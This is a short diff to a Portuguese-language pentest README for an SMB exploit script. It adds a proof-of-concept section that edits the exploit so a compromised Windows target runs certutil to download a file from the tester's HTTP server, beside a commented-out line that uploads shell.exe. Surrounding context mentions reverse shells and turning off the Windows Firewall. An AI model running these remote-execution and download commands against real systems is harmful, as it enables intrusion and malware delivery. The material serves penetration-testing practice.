@@ -62,6 +62,19 @@ Caso você queira tentar ganhar uma shell reversa vou deixar os comandos necess�
 $ python2.7 exploit.py <target ip>
 ```
 
+## PoC
+
+- Na sua máquina execute
+```bash
+touch test
+python3 -m http.server 80
+```
+- na exploit altera as linhas 922 e 923
+```python
+#smb_send_file(smbConn, './shell.exe', 'C', '/shell.exe') #922
+service_exec(conn, r'cmd /c certutil.exe -urlcache -f http://<your ip>:80/test test') #923
+```
+
 ## Comandos úteis do Windows para pentest
 - Comando para desligar o Firewall do Windows
 ```shell
